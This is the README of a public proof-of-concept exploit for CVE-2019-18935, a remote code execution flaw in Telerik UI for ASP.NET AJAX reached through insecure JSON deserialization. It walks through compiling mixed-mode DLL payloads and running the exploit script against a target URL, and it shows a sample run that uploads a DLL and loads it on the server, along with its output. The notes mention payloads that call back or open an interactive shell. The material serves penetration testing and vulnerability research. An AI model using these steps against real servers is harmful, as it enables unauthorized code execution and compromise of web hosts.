# CVE-2019-18935

Proof-of-concept exploit for a .NET JSON deserialization vulnerability in Telerik UI for ASP.NET AJAX allowing remote code execution.

<div align="center">
    <img src="https://know.bishopfox.com/hubfs/Bishop-Fox_Blog-Post_Telerik_FI_frame.png" width="300px" />
</div>

## Description

[Telerik UI for ASP.NET AJAX](https://www.telerik.com/products/aspnet-ajax.aspx) is a widely used suite of UI components for web applications. It insecurely deserializes JSON objects in a manner that results in arbitrary remote code execution on the software's underlying host. For more information, see:
- The DerpCon talk [.NET Roulette](https://www.youtube.com/watch?v=--6PiuvBGAU) ([slides](https://know.bishopfox.com/cs/c/?cta_guid=80aa4ac9-84b9-45a4-9cf3-9f215e3f714a&placement_guid=f9ff0e1a-d44c-42ce-8be3-480356af7dc7&portal_id=5632775&canon=https%3A%2F%2Fknow.bishopfox.com%2Fevents%2Fbarrett-darnell-to-present-at-derpcon&redirect_url=APefjpGudybbT_RflCPD6bnEJCJeiyJQwOw2sIK_LZsJpPzGa3E7Q0zgcY2tAhXlkopDbQCzU_G0nEWApdZDnvmHG0BXZdg3RVqaDZTM7kRj-B-MgSRZtZf3sBb_IpKbpAYruI5qNjK-squ1hOQ-Ubq5hoeoYk8B_kwsDSuP7dyoJA5jUMpOdLd6GMURDLATA5GJfm0sOzClndse_fbJg10zBRMQ-byd_ikGcy3ttuQMBRJXkKHPCDFTMp5tODRK66YwFDGfL16GHjOiKLim0ORMvYzyCjOr6RS0qMUDfRbywQIcMWrd7hKI7XiphcZOXf7JcsstSrHn&click=a3983a0a-2932-41a5-b67f-deb4eee8a399&hsutk=2fd63671b84547f0be515dffcd468a6e&signature=AAH58kGXBfVBLDcwiB-xjb6tdRfjxsQXSw&pageId=28318760929&contentType=blog-post&__hstc=24978341.2fd63671b84547f0be515dffcd468a6e.1592575907261.1592575907261.1592575907261.1&__hssc=24978341.1.1592575907263&__hsfp=1563242614)) which details extra fundamentals about exploiting insecure deserialization, applies that to this exploit, and walks through some tips and tricks for getting shells on ASP.NET web applications.
- The [full write-up](https://hubs.ly/H0mfk7r0) at Bishop Fox, including a complete walkthrough of this vulnerability and exploit details for this issue (along with patching instructions).

## Getting started

### Prerequisites

You'll need [Visual Studio](https://visualstudio.microsoft.com/downloads/) installed to compile mixed-mode .NET assembly DLL payloads using `build_dll.bat`.

### Install

```bash
git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935
python3 -m venv env
source env/bin/activate
python3 -m pip install -U pip
python3 -m pip install -r requirements.txt
```

This exploit leverages encryption logic from [RAU_crypto](https://github.com/bao7uo/RAU_crypto). The `RAUCipher` class within `RAU_crypto.py` depends on PyCryptodome, a drop-in [replacement](https://blog.sqreen.com/stop-using-pycrypto-use-pycryptodome/) for the [dead](https://github.com/dlitz/pycrypto/issues/238) PyCrypto module. PyCryptodome and PyCrypto create problems when installed in the same environment, so the best way to satisfy this dependency is to install the module within a virtual environment, as shown above.

### Configure

Point [line 26](https://github.com/noperator/CVE-2019-18935/blob/master/build_dll.bat#L26) of `build_dll.bat` to the path of your Visual Studio installation.

```vbscript
call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat" %%a
```

### Usage

```
$ python3 CVE-2019-18935.py -h
usage: CVE-2019-18935.py [-h] [-t] [-d] [-r FILENAME_REMOTE] [-s SMB_SERVER]
                         [-v UI_VERSION] [-n NET_VERSION] [-p PAYLOAD]
                         [-f FOLDER] -u URL

Exploit for CVE-2019-18935, a .NET JSON deserialization vulnerability in
Telerik UI for ASP.NET AJAX.

optional arguments:
  -h, --help          show this help message and exit
  -t                  just upload a file
  -d                  just deserialize
  -r FILENAME_REMOTE  remote payload name, for optional use with -d
  -s SMB_SERVER       remote SMB server, for optional use with -d
  -v UI_VERSION       software version
  -n NET_VERSION      .NET version
  -p PAYLOAD          mixed mode assembly DLL
  -f FOLDER           destination folder on target
  -u URL              https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau
```

#### Compile mixed mode assembly DLL payload

In a Windows environment with Visual Studio installed, use `build_dll.bat` to generate 32- and 64-bit mixed mode assembly DLLs to be used as a payload during deserialization.

```vbscript
build_dll.bat sleep.c
```

#### Upload and load payload into application via insecure deserialization

Pass the DLL generated above to `CVE-2019-18935.py`, which will upload the DLL to a directory on the target server (provided that the web server has write permissions) and then load that DLL into the application via the insecure deserialization exploit.

```
$ python3 CVE-2019-18935.py -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -v <VERSION> -f 'C:\Windows\Temp' -p sleep_2019121205271355_x86.dll
[*] Local payload name:  sleep_2019121205271355_x86.dll
[*] Destination folder:  C:\Windows\Temp
[*] Remote payload name: 1576142987.918625.dll

{'fileInfo': {'ContentLength': 75264,
              'ContentType': 'application/octet-stream',
              'DateJson': '1970-01-01T00:00:00.000Z',
              'FileName': '1576142987.918625.dll',
              'Index': 0},
 'metaData': {'AsyncUploadTypeName': 'Telerik.Web.UI.UploadedFileInfo, '
                                     'Telerik.Web.UI, Version=<VERSION>, '
                                     'Culture=neutral, '
                                     'PublicKeyToken=<TOKEN>',
              'TempFileName': '1576142987.918625.dll'}}

[*] Triggering deserialization...

<title>Runtime Error</title>
<span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
<h2> <i>Runtime Error</i> </h2></span>
...omitted for brevity...

[*] Response time: 13.01 seconds
```

In the example above, the application took at least 10 seconds to respond, indicating that the DLL payload successfully invoked `Sleep(10000)`.

### Troubleshooting

- Each payload only works once. You'll need to compile and upload a new one each time you want the target to sleep, call back, etc.
- Ensure you're targeting the right architecture (32- or 64-bit). This may take some guesswork.

## Back matter

### Legal disclaimer

Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

### Acknowledgements

[@mwulftange](https://twitter.com/mwulftange) initially [discovered](https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html) this vulnerability. [@bao7uo](https://github.com/bao7uo) wrote all of the logic for [breaking RadAsyncUpload encryption](https://github.com/bao7uo/RAU_crypto), which enabled manipulating the file upload configuration object in `rauPostData` and subsequently exploiting insecure deserialization of that object.

### See also

- [Telerik Revisited](https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html) (@mwulftange)
- [RAU_crypto](https://github.com/bao7uo/RAU_crypto) (@bau7uo)
- .NET Roulette [talk](https://www.youtube.com/watch?v=--6PiuvBGAU) and [slides](https://know.bishopfox.com/cs/c/?cta_guid=80aa4ac9-84b9-45a4-9cf3-9f215e3f714a&placement_guid=f9ff0e1a-d44c-42ce-8be3-480356af7dc7&portal_id=5632775&canon=https%3A%2F%2Fknow.bishopfox.com%2Fevents%2Fbarrett-darnell-to-present-at-derpcon&redirect_url=APefjpGudybbT_RflCPD6bnEJCJeiyJQwOw2sIK_LZsJpPzGa3E7Q0zgcY2tAhXlkopDbQCzU_G0nEWApdZDnvmHG0BXZdg3RVqaDZTM7kRj-B-MgSRZtZf3sBb_IpKbpAYruI5qNjK-squ1hOQ-Ubq5hoeoYk8B_kwsDSuP7dyoJA5jUMpOdLd6GMURDLATA5GJfm0sOzClndse_fbJg10zBRMQ-byd_ikGcy3ttuQMBRJXkKHPCDFTMp5tODRK66YwFDGfL16GHjOiKLim0ORMvYzyCjOr6RS0qMUDfRbywQIcMWrd7hKI7XiphcZOXf7JcsstSrHn&click=a3983a0a-2932-41a5-b67f-deb4eee8a399&hsutk=2fd63671b84547f0be515dffcd468a6e&signature=AAH58kGXBfVBLDcwiB-xjb6tdRfjxsQXSw&pageId=28318760929&contentType=blog-post&__hstc=24978341.2fd63671b84547f0be515dffcd468a6e.1592575907261.1592575907261.1592575907261.1&__hssc=24978341.1.1592575907263&__hsfp=1563242614) (DerpCon)
- [Full write-up](https://hubs.ly/H0mfk7r0) (Bishop Fox)

### To-do

- [ ] Adjust C payload to optionally run a single command, rather than opening an interactive shell
- [ ] Modify the assembly name of already compiled DLL to avoid recompiling for the same target
- [ ] Demonstrate brute-forcing major Telerik UI versions (i.e., the _year_ portion of the version string)

### License

This project is licensed under the [Apache License](LICENSE.md).
